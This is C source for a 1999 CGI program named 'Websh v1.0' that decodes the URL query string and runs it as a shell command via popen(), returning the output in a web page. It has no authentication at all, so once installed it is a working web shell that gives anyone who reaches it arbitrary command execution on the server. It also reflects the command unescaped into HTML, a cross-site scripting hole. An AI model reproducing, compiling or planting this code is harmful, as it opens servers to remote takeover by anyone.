/*
 * Websh v1.0 - Programmed by Joe Burnett
 *
 *    Compile: cc -o websh.cgi websh.c
 *    (You can replace "cc" with whatever compiler you like)
 *
 * (I used x2c() from "query.c" by NCSA)
 *
 * (C) Copyright 1999, All Rights Reserved.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char x2c(char *what);
int header();
int footer();

int
main() {
   FILE *out;
   char *qs = (char *)malloc(256);
   int x = 0, i = 0, c = 0, f = 0;
	qs = getenv("QUERY_STRING");
	if (qs != NULL) {
		for (x = 0, i = 0; qs[i]; x++, i++) {
			if ((qs[x] = qs[i]) == '%') {
				qs[x] = x2c(&qs[i + 1]);
				i += 2;
			  }
		  }
		qs[x] = '\0';
		for (x = 0; qs[x]; x++) {
			if (qs[x] == '+') {
				qs[x] = ' ';
			  }
		  }
		header(qs);
		out = popen(qs, "r");
		if (out != NULL) {
			while (c != EOF) {
				c = fgetc(out);
				if (c != EOF && c != '\0') {
					printf("%c", (char) c);
					f++;
				  }
			  }
			pclose(out);
		}
		if (f == 0 && strcmp(qs, "") != 0)
			printf("websh: %s: command not found\n", qs);
	}
	footer();
   return(0);
}

char x2c(char *what)
{
  register char digit;
          
  digit = (what[0] >= 'A' ? ((what[0] & 0xdf) - 'A')+10 : (what[0] - '0'));
  digit *= 16;
  digit += (what[1] >= 'A' ? ((what[1] & 0xdf) - 'A')+10 : (what[1] - '0'));
  return (digit);
}

int
header(char *qs) {
	printf("Content-type: text/html\n\n");
	printf("<html>\n<head><title>WebSH</title></head>\n");
	printf("<body bgcolor=\"#ffffff\">\n");
	printf("<dir><h1>WebSH v1.0</h1>\n");
        printf("<ISINDEX prompt=\"Command to Execute: \">\n");
	printf("<br><b>Command output:</b> [<em>%s</em>]", qs);
        printf(" - %s\n", getenv("REMOTE_ADDR"));
        printf("<br><pre>\n");
}

int
footer() {
	printf("</pre>\n</dir>\n</body></html>\n");
}
